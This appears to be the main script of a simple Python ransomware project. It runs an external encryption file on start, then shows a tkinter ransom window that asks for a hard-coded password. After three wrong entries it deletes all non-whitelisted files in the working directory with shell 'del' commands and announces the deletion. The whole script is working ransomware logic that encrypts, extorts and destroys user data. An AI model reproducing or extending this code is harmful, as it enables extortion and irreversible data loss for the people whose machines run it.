import os
import tkinter
from tkinter import *
from tkinter import ttk
from PIL import ImageTk,Image

## code to run encryption
with open('encrypt.py','r') as encrypt_file:
    encrypt_data= encrypt_file.read()
    #print(encrypt_data)
    exec(encrypt_data)
## end of code to run encryption
tries = 3
def get_pwd():
    global x
    secret_code = "help"
    if pwd_entry.get() == secret_code:

        ## just code to run "decrypt.py"
        with open('decrypt.py','r') as decrypt_file:
            #global x
            decrypt_data= decrypt_file.read()
            #print(decrypt_data)
            exec(decrypt_data)
            x = False

        ## end of code to run "decrypt.py"

        ## run bye.py "file saying your files are safe"
            os.system('python scripts/bye.py --image images/bye.gif --text "You\'re files are safe now!"')
            win.destroy()
    else:
        global tries
        tries-=1
        print(f"tries left: {tries}")

    if tries == 1:
        global ent_data
        ent_data = set("This is your last chance!")
    elif tries ==0:
        for file in os.listdir():
            if file not in ["env","enc_key","scripts","encrypt.py","__pycache__","decrypt.py","images","app.py","bye.py",".git"]:
                os.system(f'del {file}')
        os.system("python scripts/bye.py --image images/deleted.gif --text \"Now I'm deleting your files\"")
        
        x = False
        win.destroy()
x=True
def kill_win(e):
        global x
        x = False
        win.destroy()
        print("[+] Killing window.")



while x is True:
    #print(x)
    win = Tk()
    ent_data = StringVar()
    img = ImageTk.PhotoImage(file="images/rans.png")
    Label(image=img).pack()
    pwd_entry = ttk.Entry(win,textvariable=ent_data)
    pwd_entry.pack()
    ttk.Button(win,text="Submit",command=get_pwd).pack()
    win.bind("<Escape>",kill_win)
    win.mainloop()
